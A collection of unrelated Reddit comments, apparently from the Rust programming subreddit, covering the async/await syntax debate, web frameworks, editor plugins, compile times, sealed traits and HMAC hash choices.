[syntastic](https://github.com/vim-syntastic/syntastic) which is a plugin for vim that takes your source code, runs it through some external checking utilities and shows you the errors they generate if any. **So what the hell should I actually do with the 86 different things you mentioned?!** Well... whatever you want to is a vague but sort of correct answer: vim has a lot of users with different ideas on how to correctly do various things (or what things are even worth doing)so there's loads of plugins that do the same sort of thing in different ways, or some that connect 3 other tools together while some are a big monolith that do everything. Some are older but maintained, stable ways of doing things (syntastic for example), some are new and more hyped up and may well replace the older stuff some day (the entire idea of language server protocol is fairly new, but it seems like a lot of editors, not just vim, are shifting to using it more and more for everything instead of the way things were before where every editor had different ways of trying to plug tools together to get IDE type features.) Personally I used LanguageClient and deoplete, and find it pretty enjoyable and well-featured, but I havne't tried ale as a replacement for or in addition to LanguageClient, nor have I tried ncm2 as a deoplete alternative. I do think going with an lsp-based system is the better idea, though. As said above: it's an idea that's gaining ground in many languages and for many editors, and personally I enjoy that now LanguageClient can handle lsp servers for me not only for rust by also python, c/c++ and others.
Looks like it's a known limitation: [https://github.com/rust-lang/rust/issues/26925](https://github.com/rust-lang/rust/issues/26925)
I think I may have written that todo but the answer is OpenGL has no way to detect this. If I am wrong let me know and I’ll fix it :)
Unfortunate they will not run no matter what I do. The playground doesn’t have access to the crates it is documenting. For some reason mdbook doesn’t let you turn off the playpen feature for rust code. Maybe I’ll add some JavaScript to remove them. 
If you are building a simple 2D sprite based indie game then I'd say a 10-second compile is an overkill.
Sure, automatic migrations are not simple. I've read through the threads detailing their motivations. It's still something I would at least call a 'Nice to have', though it might be more of a blocker for others in my team. I agree that using OpenID should be the 'prefered' authentication method. But it's not always applicable. Individually these might not be difficult to implement. But as a whole they make up a large amount of boilerplate. Combined with Rust's steep learning curve and arguably lower productivity (don't get me wrong I love Rust) makes it a more difficult investment for management. 
Rust should really be focusing on building a better story around networking, not web. Web has been overdone in practically every language, and most things in web make more sense in a GCed language. Where Rust can shine is providing Netty, Wangle, Finangle like abstractions and making XDP easier to use for normal folks. Rust is a great language to build network services in.
Doesn't seem like bikeshedding to me. From what I've seen the discussions are about (among others): * What's more readable/scannable * How to make precedence obvious or intuitive * How it fits in with the rest of Rust's syntax * The possibility of more generic solutions It certainly makes sense to care about that. Code written with this feature will be read *a lot*.
The reason I call it bikeshedding isn't that it isn't meaningful (it is!), but that it's _simple_ to hold an opinion, and any of the many options would _work_ though some slightly better than others. It's like the naming of a function: it has an aesthetic value, but whatever choice is made isn't going to make a functional difference. We've decided that we want the bikeshed, where to put the bikeshed, and how the bikeshed is going to function. It's just how the bikeshed looks that we're talking about now. The bikeshed color definitely matters. Nobody will move in if you paint it Puke-Orange.
No, but you could see the source code and gain some understanding of how it has been done successfully by others. Unless this is a homework assignment that forbids you from using the source of established crates, that would probably work, no?
To me, "bikeshedding" certainly implies it's something trivial and unimportant. And functional differences aren't everything. I did a quick google for `define:bikeshedding` and it seems I'm not being tricked by my non-native english experiences. When I look up "trivial" I see "of little value or importance", which is a word you used. To me calling things like this "bikeshedding" or "trivial" is quite demotivating. I think the cause for the large amount of discussion is the subjective nature of readability, and what situations you want to give priority to readability-wise.
Yeah, I am probably a bit harsh to call it bikeshedding. It's a vague term in any case. And here, though maybe improper, I use trivial not to mean "of little value", but more as "of little impact". The same code works in any of the proposed styles, it's just a matter of how it's presented. I still personally do think it's a bikeshed color (though that may be because I'm tired and a bit salty at the amount of noise in the thread), but it's a very important bikeshed color; after all, it's the bikeshed in which we'll be displaying Rust's web (and other IO) future\* for years to come. \*pun half intended
`itsdangerous` can be trivially implemented by combining [`base64`](https://docs.rs/base64) and [`hmac`](http://docs.rs/hmac/) (or any other [MAC](https://github.com/RustCrypto/MACs) for what it's worth). The same goes for [password hashing](https://github.com/RustCrypto/password-hashing). There is still work to be done to make it more convenient for web developers, but primitives already here.
As another indie developer using UE4, trust me I relate. Not to mention how often UE4 crashes...launching the editor alone takes a minute or two to do. Don't even get me started on debugging... For all the compiler magic rust does, I'd actually expect it to take way *longer* (not really though, since in rust we're not `#include`-ing a billion files that need to be recompiled constantly). I don't understand how a minute to recompile is too long though... If you want a toy 2D engine with fast iteration go use JavaScript or something...rust has a completely different use-case though so obviously it's not going to recompile as fast.
Then maybe you shouldn't be using rust. It's a completely different use case. If you're inexperienced and need fast iteration, use Godot, PyGame, or a JS game engine. Unity takes longer to recompile than a simple rust demo too, so they're really not doing too bad at all on the rust end of things.
I'm sure I saw a bare bones static file webserver crate but I can't remember the name. 
Definitely feasible. On top of the other suggestions there is also the option of using Rust with WebAssembly to make a game. For example [here](https://koute.github.io/pinky-web/) is a NES emulator written in Rust that runs in the browser.
For internationalization support, there is fluent-rs: [https://github.com/projectfluent/fluent-rs](https://github.com/projectfluent/fluent-rs)
The majority of the time the winner is not determined by technical merits. Idk if I would call the mentality you describe unhealthy, just naively optimistic. Java is hated by most including those that use it daily yet it is still the most in demand. At points the scala community was growing fast and felt similar to the rust community. Now its growth has slowed greatly and it will likely fall by the wayside. Also, Look at how difficult rust is to use, lifetimes + tokio are ridiculous. All it will take is another programming language to come a long that is a bit easier to use for rust to lose significant market-share.
I've never written a `build.rs`, but [this StackOverflow answer](https://stackoverflow.com/a/51527388/435253) looks relevant. According to it, the proper solution is to add `println!("cargo:rustc-link-lib=X11");` to the `build.rs`. (Bearing in mind that the order of linker arguments is important, so the point at which you insert it into `build.rs` may be significant.)
&gt; Given how bikesheddable any purely syntax issue is, it'll get 1000 comments, burn out anyone trying to help manage the flood, get locked, then the language team will pick one they think is good and will earn the least hate, then the community will complain and get used to it in a few months, as happened with ?. I think I'm fine with that. :) . It was OK for `?`, it was OK for modules debate. Lot of high quality bikesheding, makes sure we have a lot of subjective opinions, and the exact choice is kind of secondary anyway.
I would honestly love to see a huge uptake and effort around rust in games. The potential is nuts. *Any* time spent waiting for compiles is bad, we should be able to pull off a lot of real-time development for games. The domain is well understood enough that we should be able to build specific tools for this case that are significantly more powerful than the normal tools.
&gt; A longer hash is suboptimal for what this is used for Truncate, then. HMAC-SHA256-160 is perfectly reasonable if you want to shave off a few bytes.
Did you intend to link it at over an hour in?
I'm super excited for Rust in games. C/C++ are pretty awful in a variety of ways and every other modern language that could replace them is garbage collected and is thus a non-starter for AAA. Other than compile times and I've heard some people complain about some low level memory management stuff that I'm sure Rust will solve eventually, it appears like an ideal language for games to me.
I switched from rocket to actix because my server got unresponsive after a few days sometimes. Now I get wierd network errors, but I've been working on another project and haven't gotten back to looking at it. Hopefully will be something simple. Besides that I like that you don't need nightly to use actix, unlike rocket. 
Kudos for the extensive migration information. I’ve experienced other releases in other ecosystems where this sort of this is not considered at all.
I like rocket for exactly that: it does what most web servers do without much ado. Actix looks really interesting, but I don’t think I have a good use case for it, with just a simple API. 
Is it possible to import modules in the current project into another file that isn't lib.rs/main.rs? For example, with the files asdf.rs, fdsa.rs, and lib.rs in my project, I'd like to use fdsa.rs in asdf.rs. When I try this (with the line "mod fdsa;" in asdf.rs), I get an error with the suggestion that fdsa.rs needs to be at either src/asdf/fdsa.rs or src/asdf/fdsa/mod.rs, and not src/fdsa.rs.
The Laravel framework is one pretty good reason to use PHP over JavaScript. 
Try out [Conqueror of Code](https://github.com/neoclide/coc.nvim), it intigrates quite nicely if you install the rls-plugin (:CocInstall coc-rls). Quite new plug in with daily github activity, really good stuff with cool deplete intigration! 
[learn-gfx-hal](https://github.com/Lokathor/learn-gfx-hal) is the *latest and greatest* in Learning `gfx-hal` Technology. Coming to stores near you! This January! We've got it all: * An author who has *never* used the library before he started doing this. I promise to not skip the important details because *I don't even know any*. * Several assistants who have only slightly more experience than that. * Not one but **two** gfx team members that the author bugs constantly when things go wrong (&lt;3 u termhn and groves). * Very, *very* wordy explanations that go over every little detail so that even beginners can follow along! (Only five lessons and already 20,175 words!) Covered so far: * Opening a Window * Turning the stupid thing on enough to clear the screen * Drawing that classic "first triangle" * A little bit of how to use shaders 
Looks good. Going to try to use it over cp for general use. Will probably still use cp for now in scripts though. Would prefer to have the progress bar contained to 1 line tho instead of drawing a new line with each step.
Highly recommended, get it fast before it's gone! (jk, hopefully it won't be gone)
Well that seals it for me. I don't want to use nightly yet. This language is new enough as it is. I guess I will have fun with actors. I guess that's better though because I have never programmed that way. Thanks for the advice. 
 I keep on improving my project [“Terminal todo list”](https://crates.io/crates/ttdl) that uses [todo.txt format](http://todotxt.org/). But I’m extending the original format with time tracking and some other features. Here you can see TTDL in action - [GIF image](https://raw.githubusercontent.com/VladimirMarkelov/ttdl/master/images/ttdl_demo.gif). The image is a bit dated but it shows the basics of how to use the application can be used in terminal (the demo is made on Windows 7 but the application works fine on Linux as well). 
 I keep on improving my project [“Terminal todo list”](https://crates.io/crates/ttdl) that uses [todo.txt format](http://todotxt.org/) to keep all items. But I’m extending the original format with time tracking and some other features. Here you can see TTDL in action - [GIF image](https://raw.githubusercontent.com/VladimirMarkelov/ttdl/master/images/ttdl_demo.gif). The image is a bit dated but it shows the basics of how to use the application in terminal(Linux and Windows 7 and above are both supported). 
I wrote up a whole comment about how `async` / `await` should use the JS prefix syntax (or similar). Then I read [this comment](https://github.com/rust-lang/rust/issues/57640#issuecomment-455846086). I only read through it quickly, but I feel this is the most important comment in the discussion. It's left me a little torn. I write a lot of TypeScript and so use a lot of async / await. I guess it's prefix await (i.e. `let a = await foo()` vs postfix await (i.e. `let a = foo().await`). The other suggestions are not so good. * Prefix await is everywhere these days. This has become a defacto common syntax. Of the 9 languages examples at the start, 5 are basically identical. There is value with going with the popular vote. Bucking a trend is very high risk. * Further there is a good reason why prefix await is suddenly so popular. It's really nice syntax. It's not a bad option. It's a very safe option. There is no downside. * In my experience when you have multiple await statements in a row then prefix await is nicer. Every statement starts with await in around the same place. It's quite neat and clean when you see that. Await on the end has the await in lots of different places horizontally. * In his prefix await example one of the issues he points out is the noise of putting an await within a statement using await. In other languages people just don't do this. They break it up into multiple statements instead. * That said you don't have to break it up with the postfix await. You can or cannot. It's up to the developer. This is what makes me think one should lean towards that. * The postfix await also aligns with the `?` try-from operator. They share some semantic similarities in how one can think of them (syntax sugar to inject code for hiding the underlying type), and so both being postfix has visual alignment. Having `?`, `.await`, and `.await?`, are quite cute. * I don't like `.await()` because it looks like a function call. * I don't like `.await!` as `.await!?` starts to become a bit silly. But I could live with it. I'm glad I'm not making the decision.
Since the announcement of the initial build of rust-pushrod, I've been diligently working on the library. I'm proud to say that it now has: * Mouse movement events * Mouse button events * Event dispatching * Base library (default traits) for UI components * Standardized event names for window events * Standardized signal names for UI component events I am still working on the widget library, and a series of basic widgets for user interaction. The goal here is to keep things simple, maintainable, and understandable. [rust-pushrod is here](https://www.github.com/KenSuenobu/rust-pushrod/), with a Roadmap, Readme, and a couple of other supporting documents. Once I get widgets ironed out (at least, the basics), I'll get a Readme in there as well. Feedback is highly welcome. It's an ambitious project, it's my first real Rust project, and I hope it gains traction.
Three cynical reasons: * no glory in writing those convenience parts there will probably be 10 more web frameworks before a team coalescences around something like a database test fixtures library like factorygirl. javacript still doesn't have one. * no business interests in writing those convenience parts no sane business is going to spend money developing a big web app in rust when there are so many better options. * no single team trying to make a complete polished package. There's no 37signals phenomena happening here, unlike elixir/phoenix where a small team has put together a highly polished webdev ecosystem rivaling rails.
Actix and actors in general are fun. In my experience actors always come with more boiler plate though. If you are doing serious work then actors arent worth it unless you are are doing micro-services imo. Check out warp/tower-web also.
I wrote a tool to watch a directory (and all its subpaths) and run a command on any changes: https://github.com/abhijat/rgr I wrote this mainly because my day job is with django and I wanted to run tests continuously when I change code for the TDD cycle. Admittedly this does roughly the same thing as eintr but I wanted to add watches for directories only if they match the extension I want, eg ignore javascript files in a django project, just watch the directories containing .py files. It should work for all type of files and commands, not just django. Still need to add a few features but I have started using it already.
My brain has been rotted by writing JavaScript, so I have to admit I have a natural predisposition for prefix await. However, I think the having the combo of `?` `.await` and `.await?` is really nice and something I hadn't fully appreciated. Still, the "magical property" syntax is a little off-putting to me. Even if "method call" isn't the proper mental model for what's happening, I feel like it better indicates some action is being taken rather than property access. Idk, I also hate the idea of more sigils.
So why bring it up? Trying to understand why that matters. 
I’m not sure what that would give me over hmac-sha1. 
Why `.await!?`, and not `.await!()?`? Like https://github.com/rust-lang/rust/issues/57640#issuecomment-455415814
Cool.
Correct me if I’m wrong but you’re the original author of flask right? How accurate do you think OP’s comparison is and how far away do you think a Rusty flask is? 
I think that sells it for me. It should be a postfix macro. Namely the examples of `future?.await!()` and `future.await!()?`. That makes chaining a little more trivial.
I think the usage here is more of a "The difficulty of the decision is way too high compared to the impact". The color of paint used matters, but it would be better to spend an equivalent amount of time/effort on other things. tl;dr: Arguing/debating over the syntax here, while somewhat important, is not worth the huge delay caused by the argument/discussion.
Ironically your comment is an example of bikeshedding. Debating the definition of bike-shedding is itself bike-shedding. I don't say this to be rude but to show how even comments with good intent can derail meaningful discussion. Rather than debating the merit of the await thread, we are discussing the definition of bike-shedding. 
&gt;Note: I am less enthusiastic about specializing the layout of data-types, having been badly burned by std::vector&lt;bool&gt; Didn't Rust already open the door by auto-aligning structs which are not marked as `repr(C)`? I don't think we can have our cake and eat it too. By saying data alignment (by default) is unspecified behavior (meaning the compiler is free to make it's own choices, and user should not assume a raw layout and only access the data via the provided interfaces), we can have optimizations not otherwise possible, such as using less memory, being more cache-local (which can significantly improve performance), and in future perhaps other optimizations as well, such as alignment driven by usage pattern heuristics. By necessity, that also means that if a developer *expects* a specific memory layout for custom optimization, they will be disappointed. They can opt-out using `repr(C)`, and gain a guaranteed layout, in turn sacrificing any optimization the compiler would otherwise be able to make. I feel specializing a data type layout is just generalization of the above. To some degree it's the same philosophy as implicit vs. explicit, which has no one right or wrong answer, because different people use Rust for different things.
I just use Plug 'Valloric/YouCompleteMe' Plug 'rust-lang/rust.vim' Seems to be enough, but ycm is not trivial to install, you have to compile it after installing.
&gt;I've often heard that people learn Haskell a lot more easily when they've never done any other programming before. Yeah. That was my theory behind trying Haskell first.
However far away fast compile times are. Right now the slow compiler is the biggest blocker to being productive in Rust. This pushes away a good number of people building services in Rust that Flask is currently used for. Including myself most of the time. 
Yeah. Considering how opinionated people *can* be, Rust's community handles these kinds of things pretty well. A pretty healthy discussion is happening, and we are sorting through things and making incremental progress.
&gt;const generics, generalized beyond built-in types. Do you expect this to include the latter parts of the original Pi trilogy, that is, defining runtime value-level types, such as being able to express "an integer ranging from 1 to 10", or "a string matching the email regex pattern", at the type level?
/r/playrust
Why should it be a macro? Return is not a macro, we don't write `foo().return!()`. A macro implies something happens which could be implemented by users, await is not.
&gt;const generics, generalized beyond built-in types. 1. Do you expect this to include the latter parts of the original Pi trilogy, that is, defining runtime value-level types, such as being able to define a Rating type specified "an integer ranging from 0 to 100", or an Email type specified as "a string matching the email regex pattern", at the type level? This isn't "const" generic, but it's important to compete in space where formal type verification is important, even though some of it may have to be done at runtime. 2. Will this (either intentionally or as a mean-to-an-end) include variable parameter generics)? So things like `println!` won't need to be a macro due to the fact it needs separate code generation for an arbitrary number of parameters?
We use actix-web. Would pick again. Fun and very approachable. 
Disclaimer: I don't use the async/await style much; I prefer to manually set up threads with tasks. I appreciate the need for it, but I probably won't use it. &amp;#x200B; Rust tends to favor verbosity over ambiguity. Instead of `if (condition) thing`, we have `if condition { thing }`. And several other design choices. So whatever we decide to do with await, we should stick to that. Based on that, prefix await feels ambiguous; all the rusty control things are of the form `keyword condition { block }`. If we go with prefix await, I'll end up just using await? { block } format, so it's crystal clear where the await starts and stops. It'd be nicely matched up with the (still unstable) try block syntax. Also based on that, postfix-as-field feels weird because it has nothing to do with fields. Not only on a literal level, but on a conceptual one too. It's hard to teach, it's hard to justify. It *does* produce very nice looking code, but that was the original argument for the trinary operator `a ? b : c` in C, and that turned out horribly (from a Rust code-clarity point of view). The try operator works in that position specifically because it is an *operator*. A unary operator. Imagine how confusing it would be if we had used the same field approach: `thing().try.other_thing().try.safe_fn().unsafe_fn().try;`. If we go postfix, I really hope we ditch the word "await" and pick a symbol. That has its own issues... but at least that doesn't mess with the concepts! I don't know what'll be picked, and I will learn to live with whatever happens. I don't have much to worry about. I just hope we don't forget the core principle of Rust, that clarity is more important than verbosity.
My bad thanks 
Other than the toy language I'm developing and the game I'm developing in Amethyst, live on [Twitch](https://twitch.tv/walterpi), I started implementing a scheme-ish Lisp with its own bytecode and a green-threaded vm. I haven't published it anywhere yet, but I will once it's ready for a 0.1 release.
Several compiler builtins that you couldn't implement are exposed as macros
I am trying to create a marker trait `Bool` which needs to be public, so other crates can use it as a bound, but should not be implementable by others. It should only ever be implemented by the types `False` and `True` which are defined in the same crate. My first solution trusts the crate users and merely marks the trait `Bool` as `unsafe`. Of course, anybody could just `unsafe impl` my marker trait and add invalid type-level `Bool`s. My second idea was to use auto traits (feature: `optin_builtin_traits`). But somehow double-negative impls don't seem to work (yet? I know rustc pointed out that this feature is still very buggy). In the code below, the bounds on `T` are simply ignored not leading to my desired behavior. pub auto trait Bool {} // forced to be make it pub :( pub auto trait NotBool {} pub enum False {} pub enum True {} impl !NotBool for False {} impl !NotBool for True {} impl&lt;T: NotBool + ?Sized&gt; !Bool for T {} // ^ compiled as if I'd written: // impl&lt;T&gt; !Bool for T {} The first item on the checklist of the [tracking issue](https://github.com/rust-lang/rust/issues/13231) reads _forbid conditional negative impls_. Is this what I experience? Does this mean it will never work the way I hope it would? Or is this just a bug in the current implementation? If it's not a bug and the error message is currently missing, **is there an alternative to seal traits?** Unfortunately sometime in the future, one won't be able to leak private types anymore. So staying forward-compatible, that trick is not option: trait Key {} pub trait Sealed: Key {} ^(reposted from last week because I've been too late to the party)
Yup. Hardware fun (with some assembly for the points that need it). Games. Databases. OS'. Browsers. There are a ton of areas I would say it's a bad idea unless it's already popular at your shop and people want it (as unlikely as that is). But in general, if you would reach for c or c++, there is a legitimate reason to consider rust. Plenty of reasons not to as well (legacy, lack of education/training, hiring issues, etc etc). But anywhere that performance and safety are actually a concern, it's a strong contender.
&gt; [prefix keyword] has become a defacto common syntax. I agree, but I can't figure out _why_. Prefix keyword with just a space _for something that returns a value_ (as opposed to `return` or `break` or `foreach` or `class` or `public` or ...) was, afaict, _unprecedented_ in C#. The closest it has is `unchecked` and `nameof` and such, but those all require parens. It feels like one of those things that looks nice in trivial examples, but is actually inconsistent with the rest of the language and suboptimal when you get to more complex situations. (And I say this despite doing lots of `async`/`await` in C#.)
&gt; I don't know what'll be picked, and I will learn to live with whatever happens. I don't have much to worry about. I just hope we don't forget the core principle of Rust, that clarity is more important than verbosity. I agree with this 100%. Which is why I don't like the idea of using @ or #. async_stuff()@? // Meh async_stuff()#? // Jesus This reminds me of Perl, or maybe sometimes Scala with the weird operators some people there come up with in their libraries. Now, in those languages, syntax like that is not a bad thing per se, but I don't think it fits Rust very well. Don't get me wrong, I _loove_ ML languages and the ability to define my own operators, but there's a reason this isn't a feature in Rust. Also, new rustlings are *already* struggling with the syntax as-is, let's not complicate it too much if we don't have to (and I'd argue that ? counts as a necessity, while also being much more intuitively related to what it does than the await stuff). I, personally, am totally fine with either prefix or postfix, as long as it's a keyword instead of a sigil. Off-topic: Now that the issue of postfix macros is coming up a lot in these discussions, I'd _really_ like those in general. 
It modifies control flow, as it does a "yield", look at the current await macro [here](https://doc.rust-lang.org/nightly/std/macro.await.html). When generators are stable this could be implemented by the user.
&gt;The order of items usually doesn’t matter in Rust (macros are a weird edge-case). There are some things to decide though:&lt; Do you know if there's a way to remove that edge case?
I like how this feature is carefully designed. But I've seen the problems caused by even well designed const features in other languages. So I suggest to try this in Nightly for a long time (one year or more) before stabilizing it. And I'd like this design to be future-compatible to the hypothetical introduction of a good Effect System in Rust. Because const annotations are viral. The suggestion by daboross of a clean and high-level way to introduce conditional const-ness should be developed in parallel with the const design.
Actix, of course. Why on the earth could you pick syncronous web-server when you have such a beatiful actor-based implementation? It may be my personal taste, but I strongly oppose blocking on async tasks, and this is what rocket does. It also is not even near as configurable. Not to say, you could write a toy web-server on Rocket, but you'd never want to have a real production app written in it.
Except for the "the people in charge burning out" part, which is real. We've seen it in the past and this current discussion is not any more manageable. Frankly I think GitHub issues are extremely the wrong choice for this kind of thing where it's easy to hold an opinion about but there's a broad spectrum of how deeply people have looked into it and actually tried to use the different options. Well, maybe it'd work if they made like 50 different issues for every aspect of the design of a new feature and then actually *closed* the tickets related to the aspects that are no longer up for discussion. But that clutters up the issue list so much that I suspect it may just be another way of saying GitHub issues are the wrong choice.
I don't think it actually qualifies as bikeshedding because they aren't debating a decision, they're [arguing semantics](https://www.merriam-webster.com/words-at-play/lets-argue-semantics) (which is another way in which debate can be derailed, but since this comment thread is actually a meta-debate it's basically on-topic). &lt;/meta-meta-debate&gt;
it has great potential - its a definite contender for the reason you mention - but it's not a clear cut unambiguous improvement. there are actually ways in which C++ can feel more fluid than rust (not by virtue of C++ being fluid, but as a result of rust being \*even less\* fluid). rust requires that you solve all the problems up-front. C++ is still better at 3d maths. rust requires digging through more vocabulary to get simple things done. The tradeoff is that you have more empirical debugging in C++, but you must test of other reasons so you need all that setup anyway. &amp;#x200B; Where I think rust has the greatest potential (vs C++) is to enable more teamwork across the web.
I ran across [this blog post](http://www.iquilezles.org/www/articles/floatingbar/floatingbar.htm) which talked about representing rational numbers using a "floating bar" type, and in the past few days managed to [implement it in Rust](https://github.com/1011X/floating_bar). Most of the basic functionality is there, now it just needs to have some functions filled in. So feel free to contribute if you're interested!
&gt; In his prefix await example one of the issues he points out is the noise of putting an await within a statement using await. In other languages people just don't do this. They break it up into multiple statements instead. In lots of his examples what comes after the await resolves could be seen as logically part of the same operation, it's just selecting a part of / tweaking the type of the return value. If Future were a monad you could easily do that on the Future before awaiting it, but that isn't the Rust we have.
What about using private modules: https://rust-lang-nursery.github.io/api-guidelines/future-proofing.html
The story of the bikeshed is that nobody has any comments on the nuclear reactor, but all hell breaks loose and an unmanageable torrent of comments flood in about the color of the nuclear reactor's bikeshed. That's what it originally came from and it definitely applies here.
most people don't need to write network services though, but would like to write a web ui for something.
&gt; `async_stuff()@? // Meh` Maybe, but the alternatives are pretty ugly too: &gt; let x = (await async_stuff())?;` or &gt; let x = async_stuff().await?; compared to just &gt; let x = async_stuff()@?;
There's also `tower-web` and `warp`. Some could argue that the actor stuff in `actix` isn't really necessary for a web server. And last time I looked, the documentation wasn't great.
&gt; is the single feature the community is waiting on The community is busy waiting on their builds to finish... Async stuff aside, if compile times go down substantially it will benefit all of us hugely (although it may not seem like a cool ‘feature’ like async-await).
Yeah, you're right about that. I don't know what the precendence story is regarding ? / await, I suppose there's no way we get something like let x = await async_stuff()?; ? Maybe that's not even a good idea, even if it were doable, because we're of course awaiting and *then* ?-ing, so....meh. Language design is hard. But I'd argue that a postfix keyword syntax (in whatever form) would look fine combined with ?, or at least not worse than @?.
I meant 'single issue' in the context of beginning ecosystem work... But yeah, compile times are a pain point. Solving that will be a journey of many releases....
&gt; If we go with prefix await, I'll end up just using `await? { block }` format, so it's crystal clear where the await starts and stops. There is no "block" in `await` - not in the same sense there are blocks in `if` and `try`. `await` is like a function in the sense that you can completely evaluate its argument before even considering that you need to `await` it.
A very interesting read, thanks for putting this together.
Welp, I guess I [changed](https://github.com/nox/arbalest/pull/8) everything already. 😂
In [https://github.com/rust-lang/rust/issues/57041](https://github.com/rust-lang/rust/issues/57041) I tracked down one rust-related non-determinism that already had an (accidental?) fix in llvm7.
The stakes are higher due to the inherent complexity of the feature, and due to one syntax over another having possibly semantic, rather than just syntactic, consequences.`?` is essentially a more concise syntax of the `try!` macro, an error handling pattern with a clean "cutoff". The module system is important to get consistent, but is usually seen as a dependency management exercise rather than "hot" code. The `await` syntax is central to Rust's async story, which is: * At the very heart of both "hot" code in terms of performance impact, * One of the biggest in terms of cognitive complexity (async programming is inherently more complex than sync) * Has significant consequences for composability (e.g. chaining async methods), as well as constructing the ecosystem for related constructs built around it (generators, channels, actors). The syntax, semantics, and ergonomics of async will have far more impactful consequences than `?` or the module system. So I do think it's very important to get right, or at least least-wrong.
I've used flask, but I've never used any of those libraries, which kind of seem overkill. It's like gluing 100 libaries Vs just writing the only bits that your application actually needs. I don't use ORM and prefer writing raw SQL. I don't see the point of validation libraries since JSON serialisation + well defined types kind of already handle most of that anyway, any other validation would be custom business rules which no library will do for you anyway? I agree about the migration library, but I've rolled my own, it's crap but does the job. I dunno, I don't like the idea of gluing lots and lots of libraries and frameworks, you might as well you Java Spring.
You are an impeccable human being. It works now. Also if you need a X11 Bindings Library and the official one won't work you can use [mine](https://github.com/FriedPandaFries/x11-rs)
Just as a heads-up, are you sure it compiles on stable? I get error[E0658]: imports can only refer to extern crate names passed with `--extern` on stable channel (see issue #53130) --&gt; ~/.cargo/registry/src/github.com-1ecc6299db9ec823/xcp-0.3.0/src/os/mod.rs:23:17 | 22 | mod linux; | ---------- not an extern crate passed with `--extern` 23 | pub use linux::{allocate_file, copy_file_bytes, probably_sparse, next_sparse_segments}; | ^^^^^ | = help: add #![feature(uniform_paths)] to the crate attributes to enable note: this import refers to the module defined here --&gt; ~/.cargo/registry/src/github.com-1ecc6299db9ec823/xcp-0.3.0/src/os/mod.rs:22:9 | 22 | mod linux; | ^^^^^^^^^^ on an older nightly (2019-01-08). I think `uniform_paths` has been stabilized in the meanwhile, but I'm not going to upgrade soon because RLS and Clippy are no longer building.
Still working on [Eko](https://github.com/ravernkoh/eko), a simple scripting language written in Rust. I’m in the middle of reworking the interpreter to use bytecode instead of walking the tree.
The point is, things such as signing, encryption and hashing absolutely shouldn't be implemented by hand. But that's why Salt/libsodium/libhydrogen exist (and have both rust and Python bindings, by the way), I wouldn't really use `itsdangerous` anymore. 
At this point it looks like we'll either have ... let foo = await getFoo(); ... or ... let foo = getFoo().await!(); These two seem like the most sane suggestions. Myself I could live with either of them.
&gt; Admittedly this does roughly the same thing as eintr... I'm not familiar with `eintr` but a popular Rust crate for this type of this is [watchexec](https://github.com/watchexec/watchexec). Not that there is anything wrong with scratching your own itch. Thanks for sharing. 
&gt; async_stuff()@? My opinion, I feel, is irrelevant in the matter (which is why I haven't participated in this in discussion in Github), but I prefer this the most for postfix syntax. I'm not thinking of the repercussions right now, but I'm not opposed to the idea of it being a prefix symbol either. something.@do_stuff()?.@do_more_stuff()?
Yeah, this looks like the exact same thing I was trying to accomplish. Serves me right for not looking before starting to code :-) Thanks for the link. I'll keep working on my project purely as a learning exercise
Interesting... Do you think if the lifetimes issue is solved by another language that the Rust team would be able to apply the solution to Rust itself as well?
Use whatever has zero blocking operations.
I prefer actix-web and it's actors are amazing for writing service with hard logic and components. It allows to easily decouple services and use them in async way. But now it seems the progress slow down, maybe the author does not have enough time now. Some problems of actix: boilerplate code. Don't use it if you need something simple. And some api decisions are not the best in my opinion. 
With so many people wanting web for rust, and there are people who have the skills to help out with this, it's not a mutually exclusive choice.
How code looks has a great impact for adoption. If people are irritated with the syntax , the fact that your language can do great things would be overshadowed. I'm constantly annoyed by Rust's semicolons, but I can endure it for all the benefits Rust gives. Still, it leaves a sour taste.
Synchronising definitions is unavoidable if your goal is to understand each other. If you say A and your interlocutor thinks you said B instead, you're going to have a meaningless discussion.
howdy folks. ill just reply to you all u/Holy_City \- u/JoshJude &amp; u/mad_poet_navarth thanks for the replies, annoyingly I didnt get an email to say people had replied. ill fix that I actually have an updated version of the Xcode audio unit building base. still AUv2, but its actually better in terms of getting AUs built for DAWs, in my mind. still uses C++ &amp; objective C. but hey im more than sure that you could do a build process without Xcode itself. its the command line tools you need. since terminal can talk to any part of the computer, it would/could just be a link &amp; some snazzy code that gets to talk to the build process of Xcode. im only saying this with a bit of certainty because ive coded in openFrameworks before using sublime text &amp; could not only run projects, but also build them. sure that openFrameworks does use Xcode, but can use other IDE within the computer. aye, im waiting the updated will pirkle book to be honest \[I have the first edition of it\], it would be nice to see AU coding without some of the techniques first implemented. but rather a better way. hmmm, I guess more thinking &amp; research is needed but if anyone else has ideas. then by all means leave a message
I had to build it on stable for it to work on my linux box.
I had a productive weekend! Published [TinyTemplate](https://github.com/bheisler/TinyTemplate) version 1.0.1. It turned out that I had to add some features to it that I didn't originally think I would need, but I think that made it a lot better. Also published [Criterion.rs](https://github.com/bheisler/criterion.rs) version 0.2.8, which switches from Handlebars to TinyTemplate and otherwise makes Criterion.rs lighter and faster as well as fixing the dependency-version conflicts that some users were having. In case anyone hasn't already seen it, I'm looking for volunteers to develop the `criterion-plot` subcrate into a first-class plot-rendering crate - [see here](https://users.rust-lang.org/t/call-for-maintainers-criterion-plot/24413) for details.
`new` could be considered a prefix keyword for something that returns a value in C#. 
Wow, thanks a lot for the links! Very nice to see that Pattern-defeating quicksort is implemented in Rust. As with the branch predictions, sorting is often not faster because of the algorithm but because of the cache optimization or such other factors that are CPU specific. As modern CPUs have 64 threads or more (and since we often cannot effectively use them), it would make sense to sort the same list of numbers with several algorithms and return the moment the fastest algo finishes.
That sounds like a plan. Thank you.
They can't be easily exploited today (for HMAC), because we only know of one (set of) collisions for SHA1, and computing more is still prohibitively expensive. However, with computers getting more powerful, or further weakness being found in SHA1, it's quite possible that more colliding SHA1 prefixes could be found, or even that SHA1 could be broken on a case-by-case basis. Using a prefix of SHA256 is more secure because it is harder to break for the same length of hash. (ie. SHA1 is not weak *because* the output is short, it is weak because of the algorithm). The current upper limit for computations on a supercomputer is probably somewhere around 2^60 operations, so even an 80-bit long hash from a "perfect" hash function will be unbreakable for the foreseeable future, and yet SHA1 has been broken at 160-bits.
is Diesel cargo thread safe ?
